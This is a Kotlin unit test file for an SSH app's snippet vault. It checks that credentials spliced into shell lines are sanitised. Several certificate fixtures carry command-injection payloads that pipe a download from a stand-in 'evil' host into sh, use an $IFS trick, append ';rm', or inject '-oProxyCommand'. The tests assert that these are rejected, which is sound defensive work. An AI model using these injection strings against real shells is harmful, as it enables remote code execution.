package app.skerry.shared.snippet

import app.skerry.shared.vault.Credential
import app.skerry.shared.vault.CredentialSecret
import kotlin.test.Test
import kotlin.test.assertEquals

private const val PUBLIC_LINE = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI temp"

class SnippetVaultValueTest {

    private fun credential(secret: CredentialSecret) = Credential("c-1", "temp_pubkey", secret)

    private fun resolve(secret: CredentialSecret, publicKey: String? = PUBLIC_LINE) =
        snippetVaultValue(credential(secret)) { _, _ -> publicKey }

    @Test
    fun `a password resolves to a secret value`() {
        assertEquals(SnippetVaultValue.Secret("s3cret"), resolve(CredentialSecret.Password("s3cret")))
    }

    @Test
    fun `a private key resolves to its public half, never the private one`() {
        val pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nprivate\n"

        val value = resolve(CredentialSecret.PrivateKey(pem, passphrase = "pp"))

        assertEquals(SnippetVaultValue.Public(PUBLIC_LINE), value)
    }

    @Test
    fun `the passphrase is offered to the derivation so an encrypted key still resolves`() {
        var seen: Pair<String, String?>? = null
        snippetVaultValue(credential(CredentialSecret.PrivateKey("pem", passphrase = "pp"))) { pem, pass ->
            seen = pem to pass
            PUBLIC_LINE
        }

        assertEquals("pem" to "pp", seen)
    }

    @Test
    fun `a key whose public half cannot be derived is unusable`() {
        assertEquals(SnippetVaultValue.Unusable, resolve(CredentialSecret.PrivateKey("garbage"), publicKey = null))
        assertEquals(SnippetVaultValue.Unusable, resolve(CredentialSecret.PrivateKey("garbage"), publicKey = "  "))
    }

    @Test
    fun `a certificate resolves to its type and blob, without the issuer's comment`() {
        // The comment is written by whoever issued the certificate, and this value is spliced into a
        // shell line: `;` and `|` in it would reach the remote shell as syntax, because the value
        // sanitizer flattens a value without quoting it.
        val value = resolve(
            CredentialSecret.Certificate(
                privateKeyPem = "pem",
                certificate = "ssh-ed25519-cert-v01@openssh.com AAAA bastion; curl evil.sh | sh",
            ),
        )

        assertEquals(SnippetVaultValue.Public("ssh-ed25519-cert-v01@openssh.com AAAA"), value)
    }

    @Test
    fun `shell syntax welded onto the type field is unusable, not spliced`() {
        // Nothing validates the type field on import — the inspector only base64-decodes the blob —
        // and `;` needs no whitespace around it, so counting fields would have let this through.
        val value = resolve(
            CredentialSecret.Certificate(
                privateKeyPem = "pem",
                certificate = "ssh-ed25519-cert-v01@openssh.com;curl\u0024IFS-sfhttp://evil/x|sh AAAA",
            ),
        )

        assertEquals(SnippetVaultValue.Unusable, value)
    }

    @Test
    fun `the field split knows every separator the certificate reader does`() {
        // U+000B separates fields for the certificate inspector too. A splitter that did not know it
        // would weld the type and the blob into one field and hand back the *comment* as the second —
        // the comment being what the trim exists to drop.
        val value = resolve(
            CredentialSecret.Certificate(
                privateKeyPem = "pem",
                certificate = "ssh-ed25519-cert-v01@openssh.com\u000BAAAA ;curl evil.sh|sh",
            ),
        )

        assertEquals(SnippetVaultValue.Public("ssh-ed25519-cert-v01@openssh.com AAAA"), value)
    }

    @Test
    fun `a type field that would read as an option is unusable`() {
        // The import dialog never looks at this field — it only base64-decodes the blob — so
        // `-oProxyCommand=…` imports cleanly and would then be handed to a command as an option.
        val value = resolve(
            CredentialSecret.Certificate(privateKeyPem = "pem", certificate = "-oProxyCommand AAAA"),
        )

        assertEquals(SnippetVaultValue.Unusable, value)
    }

    @Test
    fun `shell syntax in the blob field is unusable too`() {
        // The other operand. Every rejection case above puts the attack in the type field, so a
        // loosened blob class would go unnoticed — and the blob is the half the importer decodes,
        // which says nothing about what a shell would make of it.
        val value = resolve(
            CredentialSecret.Certificate(privateKeyPem = "pem", certificate = "ssh-ed25519-cert-v01@openssh.com AAAA;rm"),
        )

        assertEquals(SnippetVaultValue.Unusable, value)
    }

    @Test
    fun `a real certificate line survives the character rule intact`() {
        // The permissive side: a type with digits and dots, and a blob with the base64 characters the
        // short fixtures above never exercise. Tightening either class would break every real
        // certificate while the rejection tests stayed green.
        val cert = "ecdsa-sha2-nistp256-cert-v01@openssh.com AAAAB3+z/dGVzdA== ci@build.example.com"

        val value = resolve(CredentialSecret.Certificate(privateKeyPem = "pem", certificate = cert))

        assertEquals(SnippetVaultValue.Public("ecdsa-sha2-nistp256-cert-v01@openssh.com AAAAB3+z/dGVzdA=="), value)
    }

    @Test
    fun `a certificate line with no blob at all is unusable`() {
        val value = resolve(CredentialSecret.Certificate(privateKeyPem = "pem", certificate = "ssh-ed25519-cert-v01@openssh.com"))

        assertEquals(SnippetVaultValue.Unusable, value)
    }

    @Test
    fun `a certificate entry with no certificate in it is unusable`() {
        // Same rule as a key whose public half will not come out: a reference with nothing behind it
        // must fail the confirmation, not splice an empty string.
        val value = resolve(CredentialSecret.Certificate(privateKeyPem = "pem", certificate = "  "))

        assertEquals(SnippetVaultValue.Unusable, value)
    }

    @Test
    fun `a file-backed secret is unusable — its material never entered the vault`() {
        val value = resolve(CredentialSecret.KeyFile(privateKeyRef = "~/.ssh/id_ed25519"))

        assertEquals(SnippetVaultValue.Unusable, value)
    }

    @Test
    fun `a secret value does not print itself`() {
        assertEquals("Secret(redacted)", SnippetVaultValue.Secret("s3cret").toString())
    }
}
